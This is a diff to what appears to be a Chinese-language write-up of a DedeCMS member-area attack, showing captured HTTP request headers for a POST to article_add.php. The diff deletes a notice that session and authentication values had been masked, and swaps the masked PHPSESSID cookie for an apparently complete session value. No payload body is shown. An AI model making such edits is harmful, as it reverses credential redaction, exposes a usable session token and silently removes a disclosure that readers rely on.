@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -80,7 +79,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Origin: http://dedecms:9876
 Cache-Control: max-age=0
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVkolGBB9b1qYBTzr
-Cookie: PHPSESSID=ul9********************n24; last_vtime=1772843080; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=f041b308abf3db0b; last_vid=test5; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=b46b29d071147f62; DedeUserID=5; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0094c7a94e5c063a; DedeLoginTime=1772843088; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=080132e7d52f0730; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D1
+Cookie: PHPSESSID=ul9tip0bsccgfh7o1bbptnmn24; last_vtime=1772843080; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=f041b308abf3db0b; last_vid=test5; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=b46b29d071147f62; DedeUserID=5; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0094c7a94e5c063a; DedeLoginTime=1772843088; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=080132e7d52f0730; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://dedecms:9876/member/article_add.php
